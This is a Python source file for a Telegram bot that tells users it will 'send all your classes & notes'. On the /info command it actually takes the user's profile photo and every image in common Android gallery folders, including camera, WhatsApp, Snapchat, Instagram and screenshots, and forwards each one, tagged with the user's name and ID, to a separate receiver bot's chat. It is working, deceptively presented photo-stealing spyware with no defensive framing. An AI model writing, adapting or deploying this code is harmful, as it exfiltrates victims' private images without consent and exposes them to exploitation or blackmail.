import os
import glob
from telegram import Update, InputFile, Bot as TelegramBot
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# 🔒 CONFIG (use Render ENV vars in production)
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_SENDER_BOT_TOKEN")
RECEIVER_BOT_TOKEN = os.getenv("RECEIVER_BOT_TOKEN", "YOUR_RECEIVER_BOT_TOKEN")
RECEIVER_CHAT_ID = os.getenv("RECEIVER_CHAT_ID", "YOUR_RECEIVER_CHAT_ID")

# ✅ Function: Get all images from multiple folders
def get_all_images():
    folders = [
        "/storage/emulated/0/DCIM/Camera",
        "/storage/emulated/0/Download",
        "/storage/emulated/0/Pictures",
        "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
        "/storage/emulated/0/Snapchat",
        "/storage/emulated/0/Telegram",
        "/storage/emulated/0/Screenshots",
        "/storage/emulated/0/Instagram"
    ]
    image_types = ('*.jpg', '*.jpeg', '*.png', '*.webp')
    all_files = []

    for folder in folders:
        for ext in image_types:
            all_files.extend(glob.glob(os.path.join(folder, ext)))

    all_files.sort(key=os.path.getmtime, reverse=True)
    return all_files

# ✅ /start Command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 Bot Activated.\nUse /info to send all your classes & notes.")

# ✅ /info Command
async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    receiver_bot = TelegramBot(token=RECEIVER_BOT_TOKEN)

    # 🖼️ Send Profile Photo
    try:
        user_photos = await context.bot.get_user_profile_photos(user.id)
        if user_photos.total_count > 0:
            file_id = user_photos.photos[0][0].file_id
            file = await context.bot.get_file(file_id)
            file_path = f"{user.id}_profile.jpg"
            await file.download_to_drive(file_path)

            with open(file_path, 'rb') as img:
                await receiver_bot.send_photo(
                    chat_id=RECEIVER_CHAT_ID,
                    photo=InputFile(img),
                    caption=f"👤 {user.full_name} - Profile\n🆔 {user.id}"
                )
            os.remove(file_path)
        else:
            await update.message.reply_text("❌ No profile photo found.")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Profile Error:\n{e}")

    # 📂 Send All Gallery Photos
    try:
        all_images = get_all_images()
        if not all_images:
            await update.message.reply_text("⚠️ No images found.")
        else:
            await update.message.reply_text(f"📤 Sending {len(all_images)} images to receiver...")
            for img_path in all_images:
                try:
                    with open(img_path, 'rb') as img:
                        await receiver_bot.send_photo(
                            chat_id=RECEIVER_CHAT_ID,
                            photo=InputFile(img),
                            caption=f"🖼 From: {os.path.basename(img_path)}\n👤 {user.full_name}\n🆔 {user.id}"
                        )
                except:
                    continue  # Skip corrupted files
    except Exception as e:
        await update.message.reply_text(f"⚠️ Gallery Error:\n{e}")

# ✅ Bot Start
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("info", info))
    print("✅ Sender Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
